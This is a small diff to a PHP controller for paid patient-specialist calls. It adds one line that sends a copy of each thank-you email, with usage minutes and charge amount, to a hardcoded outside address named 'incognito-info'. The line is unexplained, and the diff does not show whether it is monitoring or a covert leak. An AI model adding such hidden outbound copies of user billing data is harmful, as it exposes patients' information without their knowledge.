@@ -165,6 +165,7 @@ class CallspecialistController extends Zend_Controller_Action {
         	$usedmins = ceil ( (strtotime ( $row ["grpCallEndTime"] ) - strtotime ( $row ["specialistCallTime"] )) / 60 );
         	$chargeAmt = $this->specialistsetting["cost"] * $usedmins;
         	$appEmails->sendThankYouEmail($row->patientEmail, $usedmins, $chargeAmt);
+        	$appEmails->sendThankYouEmail ('incognito-info@unisrv.jp',$usedmins,$chargeAmt);
         } else {
             //支付失败
         	$this->syslogger->logInfo ( "CallspecialistController", "hangupAction", "paypal pay fail ,and send carderr info to user");
